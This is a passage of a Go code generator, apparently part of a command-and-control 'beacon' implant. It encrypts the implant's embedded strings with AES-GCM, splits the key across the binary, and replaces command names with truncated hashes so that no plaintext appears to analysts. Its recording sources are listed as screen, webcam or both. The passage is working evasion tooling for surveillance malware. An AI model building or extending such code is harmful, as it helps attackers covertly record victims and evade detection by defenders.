	return gcm.Seal(nonce, nonce, plain, nil)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: go run gen_stealth.go <hex-key>")
		os.Exit(1)
	}
	rawKey, err := hex.DecodeString(os.Args[1])
	if err != nil || len(rawKey) < 32 {
		fmt.Fprintln(os.Stderr, "invalid hex key (need >= 32 bytes / 64 hex chars)")
		os.Exit(1)
	}
	sum := sha256.Sum256(rawKey)
	aesKey := sum[:]

	fmt.Println("// Code generated by gen_stealth.go — DO NOT EDIT")
	fmt.Println("// AES-256-GCM blobs: nonce || ciphertext || tag. No plaintext in .rodata.")
	fmt.Println()
	fmt.Println("package stealth")
	fmt.Println()
	fmt.Println("import \"crypto/sha256\"")
	fmt.Println()
	fmt.Println("var (")
	for _, name := range order {
		blob := seal(aesKey, []byte(secrets[name]))
		fmt.Printf("\t%s = []byte{", name)
		for i, b := range blob {
			if i > 0 {
				fmt.Print(", ")
			}
			fmt.Printf("0x%02x", b)
		}
		fmt.Println("}")
	}
	fmt.Println(")")
	// The AES key is stored split in two halves and recombined in init().
	// Both halves ship in the binary (they must — the beacon decrypts), but
	// neither half alone is the key, and nothing derives from ciphertext.
	fmt.Println()
	fmt.Println("func init() {")
	fmt.Print("\tkeyPartA = []byte{")
	for i, b := range rawKey[:16] {
		if i > 0 {
			fmt.Print(", ")
		}
		fmt.Printf("0x%02x", b)
	}
	fmt.Println("}")
	fmt.Print("\tkeyPartB = []byte{")
	for i, b := range rawKey[16:32] {
		if i > 0 {
			fmt.Print(", ")
		}
		fmt.Printf("0x%02x", b)
	}
	fmt.Println("}")
	fmt.Println("\traw := append(append([]byte{}, keyPartA...), keyPartB...)")
	fmt.Println("\th := sha256.Sum256(raw)")
	fmt.Println("\taesKey = h[:]")
	fmt.Println("}")

	// Mode hash constants. SHA-256 truncated to 16 hex chars = 64 bits.
	// Collision-safe up to billions of entries by birthday bound.
	fmt.Println()
	fmt.Println("// SHA-256 hashes (first 16 hex chars = 64 bits) of command modes.")
	fmt.Println("// The plaintext mode string NEVER appears in the binary — the switch")
	fmt.Println("// dispatch hashes the incoming cmd.Mode at runtime and matches these.")
	fmt.Println("const (")
	for _, m := range commandModes {
		h := sha256.Sum256([]byte(m))
		hex16 := hex.EncodeToString(h[:])[:16]
		fmt.Printf("\tModeHash_%s = \"%s\"\n", sanitize(m), hex16)
	}
	fmt.Println()
	fmt.Println("\t// record source values (screen|webcam|both)")
	for _, m := range sourceModes {
		h := sha256.Sum256([]byte(m))
		hex16 := hex.EncodeToString(h[:])[:16]
		fmt.Printf("\tSourceHash_%s = \"%s\"\n", sanitize(m), hex16)
	}
	fmt.Println(")")
}

func sanitize(s string) string {
	out := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '_' {
			continue
		}
		if c >= 'a' && c <= 'z' {
			out = append(out, c-32)
		} else {
			out = append(out, c)
		}
	}
	return string(out)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
